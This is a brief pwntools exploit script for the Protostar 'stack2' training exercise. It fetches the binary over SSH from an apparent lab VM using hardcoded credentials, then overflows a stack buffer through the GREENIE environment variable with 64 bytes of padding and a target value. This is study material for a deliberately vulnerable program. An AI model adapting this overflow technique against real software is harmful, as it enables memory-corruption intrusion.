import os, sys, subprocess
from pwn import *

context(arch='i686', os='linux')

shell = ssh(host='192.168.94.129', user='user', password='user', port=22)
shell.download_file('/opt/protostar/bin/stack2')
if not os.access('./stack2', os.X_OK):
    subprocess.call('chmod +x ./stack2', shell=True)

junk = 'A'*cyclic_find(0x61616171) # 64
correct = p32(0xd0a0d0a, endian='little')

env = {'GREENIE': junk+correct}

p = process('./stack2', env=env)
log.info(p.recv())
